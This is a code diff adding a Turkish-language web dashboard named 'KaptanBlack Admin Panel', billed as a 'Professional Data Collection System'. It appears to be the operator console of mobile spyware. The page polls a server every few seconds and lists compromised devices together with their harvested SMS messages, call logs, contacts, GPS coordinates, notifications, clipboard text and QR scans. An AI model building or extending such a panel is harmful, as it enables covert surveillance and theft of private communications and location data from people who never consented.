@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KaptanBlack Admin Panel</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0f0f1e;
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+        .header {
+            background: #1a1a2e;
+            padding: 1.5rem 2rem;
+            border-bottom: 2px solid #667eea;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo { display: flex; align-items: center; gap: 1rem; }
+        .logo-icon {
+            width: 45px; height: 45px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 12px;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: bold; font-size: 1.2rem; color: white;
+        }
+        .logo-text { font-size: 1.5rem; font-weight: 600; color: #667eea; }
+        .status { display: flex; align-items: center; gap: 0.5rem; color: #4ade80; }
+        .container { max-width: 1400px; margin: 0 auto; padding: 2rem; }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 1rem; margin-bottom: 2rem;
+        }
+        .stat-card {
+            background: #1a1a2e;
+            border: 1px solid #333;
+            border-radius: 12px; padding: 1.25rem;
+            text-align: center;
+        }
+        .stat-label { font-size: 0.8rem; color: #888; text-transform: uppercase; margin-bottom: 0.5rem; }
+        .stat-value { font-size: 2rem; font-weight: 700; color: #667eea; }
+        .main-content { display: grid; grid-template-columns: 1fr 1fr; gap: 2rem; margin-bottom: 2rem; }
+        @media (max-width: 1024px) { .main-content { grid-template-columns: 1fr; } }
+        .panel-section {
+            background: #1a1a2e;
+            border: 1px solid #333;
+            border-radius: 12px; padding: 1.5rem;
+        }
+        .section-title { font-size: 1.1rem; font-weight: 600; color: #667eea; margin-bottom: 1rem; }
+        .device-list { max-height: 300px; overflow-y: auto; }
+        .device-item {
+            background: #0f0f23;
+            border: 1px solid #333;
+            border-radius: 8px; padding: 0.75rem;
+            margin-bottom: 0.5rem;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .device-name { font-weight: 500; color: #fff; }
+        .device-id { font-size: 0.75rem; color: #888; }
+        .device-status {
+            padding: 0.2rem 0.6rem; border-radius: 20px;
+            font-size: 0.7rem; background: rgba(74,222,128,0.2); color: #4ade80; border: 1px solid #4ade80;
+        }
+        .data-log {
+            background: #0f0f23;
+            border: 1px solid #333;
+            border-radius: 8px; padding: 1rem;
+            font-family: 'Courier New', monospace; font-size: 0.8rem;
+            max-height: 300px; overflow-y: auto;
+            white-space: pre-wrap; word-break: break-all;
+        }
+        .btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white; border: none;
+            padding: 0.6rem 1.2rem; border-radius: 8px;
+            font-weight: 500; cursor: pointer;
+            margin-right: 0.5rem; margin-bottom: 0.5rem;
+        }
+        .btn-secondary { background: #333; border: 1px solid #444; }
+        .empty-state { text-align: center; padding: 2rem; color: #888; }
+        .data-card {
+            background: #0f0f23;
+            border: 1px solid #333;
+            border-radius: 8px; padding: 1rem;
+            margin-bottom: 0.75rem;
+        }
+        .data-card-header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 0.75rem;
+        }
+        .data-type {
+            padding: 0.2rem 0.6rem; border-radius: 6px;
+            font-size: 0.7rem; font-weight: 600;
+        }
+        .type-qr { background: rgba(102,126,234,0.2); color: #667eea; border: 1px solid #667eea; }
+        .type-sms { background: rgba(239,68,68,0.2); color: #ef4444; border: 1px solid #ef4444; }
+        .type-call { background: rgba(245,158,11,0.2); color: #f59e0b; border: 1px solid #f59e0b; }
+        .type-contact { background: rgba(16,185,129,0.2); color: #10b981; border: 1px solid #10b981; }
+        .type-location { background: rgba(59,130,246,0.2); color: #3b82f6; border: 1px solid #3b82f6; }
+        .type-system { background: rgba(139,92,246,0.2); color: #8b5cf6; border: 1px solid #8b5cf6; }
+        .data-time { font-size: 0.75rem; color: #888; }
+        .data-content { font-size: 0.85rem; color: #ccc; }
+        .contact-item {
+            display: flex; justify-content: space-between;
+            padding: 0.4rem 0; border-bottom: 1px solid #333;
+        }
+        .contact-name { color: #fff; font-weight: 500; }
+        .contact-phone { color: #667eea; font-family: monospace; }
+        .sms-item {
+            padding: 0.5rem; margin-bottom: 0.5rem;
+            background: #1a1a2e; border-radius: 6px;
+        }
+        .sms-from { color: #667eea; font-weight: 500; margin-bottom: 0.25rem; }
+        .sms-body { color: #ccc; font-size: 0.8rem; }
+        .call-item {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 0.4rem 0; border-bottom: 1px solid #333;
+        }
+        .call-number { color: #fff; }
+        .call-type { font-size: 0.75rem; padding: 0.15rem 0.4rem; border-radius: 4px; }
+        .call-incoming { background: rgba(16,185,129,0.2); color: #10b981; }
+        .call-outgoing { background: rgba(102,126,234,0.2); color: #667eea; }
+        .call-missed { background: rgba(239,68,68,0.2); color: #ef4444; }
+        .footer { text-align: center; padding: 2rem; color: #888; border-top: 1px solid #333; margin-top: 2rem; }
+        .footer-brand { color: #667eea; font-weight: 600; }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo">
+            <div class="logo-icon">KB</div>
+            <div class="logo-text">KaptanBlack Admin</div>
+        </div>
+        <div class="status">
+            <span>●</span> Online
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-label">Cihazlar</div>
+                <div class="stat-value" id="deviceCount">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">QR Taramalar</div>
+                <div class="stat-value" id="qrCount">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Toplam Veri</div>
+                <div class="stat-value" id="totalData">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">SMS</div>
+                <div class="stat-value" id="smsCount">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Aramalar</div>
+                <div class="stat-value" id="callCount">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Kisiler</div>
+                <div class="stat-value" id="contactCount">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Bildirimler</div>
+                <div class="stat-value" id="notificationCount">0</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-label">Pano</div>
+                <div class="stat-value" id="clipboardCount">0</div>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="panel-section">
+                <div class="section-title">Bagli Cihazlar</div>
+                <div class="device-list" id="deviceList">
+                    <div class="empty-state">Henüz cihaz baglanmadi</div>
+                </div>
+            </div>
+
+            <div class="panel-section">
+                <div class="section-title">Canli Veri Akisi</div>
+                <div style="margin-bottom: 1rem;">
+                    <button class="btn" onclick="refreshData()">Yenile</button>
+                    <button class="btn btn-secondary" onclick="clearLogs()">Temizle</button>
+                </div>
+                <div class="data-log" id="dataLog">Veri bekleniyor...</div>
+            </div>
+        </div>
+
+        <div class="panel-section">
+            <div class="section-title">Son Veriler</div>
+            <div id="recentData">
+                <div class="empty-state">Henüz veri gelmedi</div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <p><span class="footer-brand">KaptanBlack Admin Panel</span> v2.0 | Professional Data Collection System</p>
+    </footer>
+
+    <script>
+        let stats = { deviceCount: 0, qrScanCount: 0, totalData: 0, smsCount: 0, callCount: 0, contactsCount: 0 };
+        let recentItems = [];
+        let logs = [];
+
+        document.addEventListener('DOMContentLoaded', function() {
+            logData(' sistem baslatildi');
+            refreshData();
+            setInterval(refreshData, 3000);
+        });
+
+        function refreshData() {
+            fetch('/api/stats')
+                .then(r => r.json())
+                .then(data => {
+                    stats = { ...stats, ...data };
+                    updateStats();
+                })
+                .catch(e => console.error('Stats error:', e));
+
+            fetch('/api/devices')
+                .then(r => r.json())
+                .then(data => updateDevices(data))
+                .catch(e => console.error('Devices error:', e));
+
+            fetch('/api/recent-data')
+                .then(r => r.json())
+                .then(data => {
+                    if (data && data.length > 0) {
+                        updateRecentData(data);
+                    }
+                })
+                .catch(e => {});
+        }
+
+        function updateStats() {
+            document.getElementById('deviceCount').textContent = stats.deviceCount || 0;
+            document.getElementById('qrCount').textContent = stats.qrScanCount || 0;
+            document.getElementById('totalData').textContent = stats.totalData || 0;
+            document.getElementById('smsCount').textContent = stats.smsCount || 0;
+            document.getElementById('callCount').textContent = stats.callCount || 0;
+            document.getElementById('contactCount').textContent = stats.contactsCount || 0;
+            document.getElementById('notificationCount').textContent = stats.notificationCount || 0;
+            document.getElementById('clipboardCount').textContent = stats.clipboardCount || 0;
+        }
+
+        function updateDevices(deviceList) {
+            const container = document.getElementById('deviceList');
+            if (!deviceList || deviceList.length === 0) {
+                container.innerHTML = '<div class="empty-state">Henüz cihaz baglanmadi</div>';
+                return;
+            }
+            container.innerHTML = deviceList.map(d => `
+                <div class="device-item">
+                    <div>
+                        <div class="device-name">${d.name || 'Bilinmeyen Cihaz'}</div>
+                        <div class="device-id">${d.id}</div>
+                    </div>
+                    <div class="device-status">Online</div>
+                </div>
+            `).join('');
+        }
+
+        function updateRecentData(data) {
+            const container = document.getElementById('recentData');
+            if (!data || data.length === 0) return;
+
+            recentItems = data.slice(0, 20);
+
+            container.innerHTML = recentItems.map(item => {
+                const time = new Date(item.timestamp).toLocaleString('tr-TR');
+                const typeClass = getTypeClass(item.type);
+                const typeLabel = getTypeLabel(item.type);
+                const content = formatDataContent(item.type, item.data);
+
+                return `
+                    <div class="data-card">
+                        <div class="data-card-header">
+                            <span class="data-type ${typeClass}">${typeLabel}</span>
+                            <span class="data-time">${time}</span>
+                        </div>
+                        <div class="data-content">${content}</div>
+                    </div>
+                `;
+            }).join('');
+
+            // Also log
+            data.forEach(item => {
+                logData(`[${item.type.toUpperCase()}] ${item.data.substring(0, 80)}...`);
+            });
+        }
+
+        function getTypeClass(type) {
+            const map = {
+                'qr_scan': 'type-qr', 'sms': 'type-sms', 'call': 'type-call',
+                'contacts': 'type-contact', 'location': 'type-location', 'system_info': 'type-system',
+                'notification': 'type-system', 'clipboard': 'type-qr'
+            };
+            return map[type] || 'type-qr';
+        }
+
+        function getTypeLabel(type) {
+            const map = {
+                'qr_scan': 'QR KOD', 'sms': 'SMS', 'call': 'ARAMA',
+                'contacts': 'KISI', 'location': 'KONUM', 'system_info': 'SISTEM',
+                'notification': 'BILDIRIM', 'clipboard': 'PANO'
+            };
+            return map[type] || type.toUpperCase();
+        }
+
+        function formatDataContent(type, data) {
+            try {
+                if (type === 'contacts') {
+                    const parsed = JSON.parse(data);
+                    if (parsed.contacts && parsed.contacts.length > 0) {
+                        return parsed.contacts.slice(0, 5).map(c => `
+                            <div class="contact-item">
+                                <span class="contact-name">${c.name || 'Unknown'}</span>
+                                <span class="contact-phone">${c.phone || 'N/A'}</span>
+                            </div>
+                        `).join('') + (parsed.contacts.length > 5 ? `<div style="color:#888;font-size:0.75rem;margin-top:0.5rem;">+ ${parsed.contacts.length - 5} daha fazla kisi</div>` : '');
+                    }
+                    return 'Kisi verisi yok';
+                } else if (type === 'sms') {
+                    const parsed = JSON.parse(data);
+                    if (parsed.messages && parsed.messages.length > 0) {
+                        return parsed.messages.slice(0, 3).map(s => `
+                            <div class="sms-item">
+                                <div class="sms-from">Kimden: ${s.from || 'Unknown'}</div>
+                                <div class="sms-body">${s.message || ''}</div>
+                            </div>
+                        `).join('') + (parsed.messages.length > 3 ? `<div style="color:#888;font-size:0.75rem;">+ ${parsed.messages.length - 3} daha fazla mesaj</div>` : '');
+                    }
+                    return 'SMS verisi yok';
+                } else if (type === 'call') {
+                    const parsed = JSON.parse(data);
+                    if (parsed.calls && parsed.calls.length > 0) {
+                        return parsed.calls.slice(0, 5).map(c => {
+                            const typeClass = c.type === 'Incoming' ? 'call-incoming' : c.type === 'Outgoing' ? 'call-outgoing' : 'call-missed';
+                            return `
+                                <div class="call-item">
+                                    <span class="call-number">${c.number || 'Unknown'}</span>
+                                    <span class="call-type ${typeClass}">${c.type || 'Unknown'}</span>
+                                </div>
+                            `;
+                        }).join('') + (parsed.calls.length > 5 ? `<div style="color:#888;font-size:0.75rem;margin-top:0.5rem;">+ ${parsed.calls.length - 5} daha fazla arama</div>` : '');
+                    }
+                    return 'Arama kaydi yok';
+                } else if (type === 'location') {
+                    const parsed = JSON.parse(data);
+                    if (parsed.location) {
+                        return `Enlem: ${parsed.location.latitude}, Boylam: ${parsed.location.longitude}`;
+                    }
+                    return 'Konum verisi yok';
+                } else if (type === 'qr_scan') {
+                    return `QR Icerik: <strong>${data}</strong>`;
+                } else if (type === 'notification') {
+                    try {
+                        const parsed = JSON.parse(data);
+                        return `<strong>Uygulama:</strong> ${parsed.package || 'Unknown'}<br><strong>Baslik:</strong> ${parsed.title || ''}<br><strong>Icerik:</strong> ${parsed.text || ''}`;
+                    } catch(e) { return data.substring(0, 200); }
+                } else if (type === 'clipboard') {
+                    try {
+                        const parsed = JSON.parse(data);
+                        return `<strong>Kopyalanan:</strong> ${parsed.text || ''}`;
+                    } catch(e) { return data.substring(0, 200); }
+                }
+                return data.substring(0, 200);
+            } catch (e) {
+                return data.substring(0, 200);
+            }
+        }
+
+        function logData(message) {
+            const timestamp = new Date().toLocaleString('tr-TR');
+            const logEntry = `[${timestamp}] ${message}`;
+            logs.push(logEntry);
+            const logContainer = document.getElementById('dataLog');
+            if (logContainer.textContent === 'Veri bekleniyor...') {
+                logContainer.textContent = '';
+            }
+            logContainer.textContent += logEntry + '\n';
+            logContainer.scrollTop = logContainer.scrollHeight;
+            if (logs.length > 100) logs.shift();
+        }
+
+        function clearLogs() {
+            logs = [];
+            document.getElementById('dataLog').textContent = 'Veri bekleniyor...';
+        }
+    </script>
+</body>
+</html>
